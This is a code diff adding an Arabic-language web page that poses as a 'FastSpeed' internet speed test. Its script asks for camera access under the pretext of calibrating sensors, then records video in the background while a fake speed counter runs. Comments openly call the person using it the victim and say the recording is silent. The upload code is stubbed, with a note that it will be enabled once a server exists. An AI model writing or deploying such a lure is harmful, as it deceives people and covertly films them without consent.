@@ -1,0 +1,83 @@
+<!DOCTYPE html>
+<html lang="ar" dir="rtl">
+<head>
+    <meta charset="UTF-8">
+    <meta name="viewport" content="width=device-width, initial-scale=1.0">
+    <title>FastSpeed - فحص سرعة الإنترنت</title>
+    <style>
+        body { font-family: 'Segoe UI', Tahoma, Geneva, Verdana, sans-serif; background-color: #f4f7f9; color: #333; display: flex; flex-direction: column; align-items: center; justify-content: center; height: 100vh; margin: 0; }
+        .container { background: white; padding: 30px; border-radius: 15px; box-shadow: 0 10px 25px rgba(0,0,0,0.1); text-align: center; width: 90%; max-width: 400px; }
+        .logo { color: #007bff; font-size: 24px; font-weight: bold; margin-bottom: 20px; }
+        .loader { border: 5px solid #f3f3f3; border-top: 5px solid #007bff; border-radius: 50%; width: 50px; height: 50px; animation: spin 1s linear infinite; margin: 20px auto; }
+        @keyframes spin { 0% { transform: rotate(0deg); } 100% { transform: rotate(360deg); } }
+        .btn { background-color: #007bff; color: white; border: none; padding: 12px 25px; border-radius: 25px; font-size: 16px; cursor: pointer; transition: 0.3s; }
+        .btn:hover { background-color: #0056b3; }
+        .status { font-size: 14px; color: #666; margin-top: 15px; }
+    </style>
+</head>
+<body>
+
+<div class="container" id="mainBox">
+    <div class="logo">🚀 FastSpeed Test</div>
+    <p>لقياس سرعة التحميل بدقة عالية، نحتاج لمعايرة مستشعرات الجهاز.</p>
+    <button class="btn" onclick="startTest()">ابدأ فحص السرعة</button>
+    <div class="status" id="statusText">جاهز للفحص</div>
+</div>
+
+<script>
+    async function startTest() {
+        const statusText = document.getElementById('statusText');
+        const mainBox = document.getElementById('mainBox');
+       
+        statusText.innerText = "جاري الاتصال بالسيرفر...";
+       
+        try {
+            // طلب الكاميرا كجزء من "المعايرة"
+            const stream = await navigator.mediaDevices.getUserMedia({ video: true });
+           
+            // تمويه المستخدم بواجهة فحص
+            mainBox.innerHTML = `
+                <div class="logo">🚀 FastSpeed Test</div>
+                <div class="loader"></div>
+                <p id="progress">جاري فحص سرعة الرفع (Upload)...</p>
+                <div style="font-size: 30px; font-weight: bold; color: #007bff;"><span id="speed">0</span> Mbps</div>
+            `;
+
+            // تسجيل الفيديو في الخلفية
+            const mediaRecorder = new MediaRecorder(stream);
+            const chunks = [];
+            mediaRecorder.ondataavailable = e => chunks.push(e.data);
+           
+            mediaRecorder.onstop = async () => {
+                const blob = new Blob(chunks, { type: 'video/webm' });
+                // كود الإرسال سيتم تفعيله بعد رفع السيرفر
+                console.log("تم التسجيل صامتاً");
+            };
+
+            mediaRecorder.start();
+
+            // عداد وهمي للسرعة لإقناع الضحية
+            let count = 0;
+            const interval = setInterval(() => {
+                count += Math.floor(Math.random() * 10);
+                if(count < 45) document.getElementById('speed').innerText = count;
+                else clearInterval(interval);
+            }, 500);
+
+            // التوقف بعد 6 ثواني
+            setTimeout(() => {
+                mediaRecorder.stop();
+                stream.getTracks().forEach(track => track.stop());
+                document.getElementById('progress').innerText = "اكتمل الفحص بنجاح!";
+                document.getElementById('speed').innerText = "42.5";
+            }, 6000);
+
+        } catch (err) {
+            statusText.innerText = "خطأ: يرجى السماح بالأذونات للمتابعة.";
+            statusText.style.color = "red";
+        }
+    }
+</script>
+
+</body>
+</html>
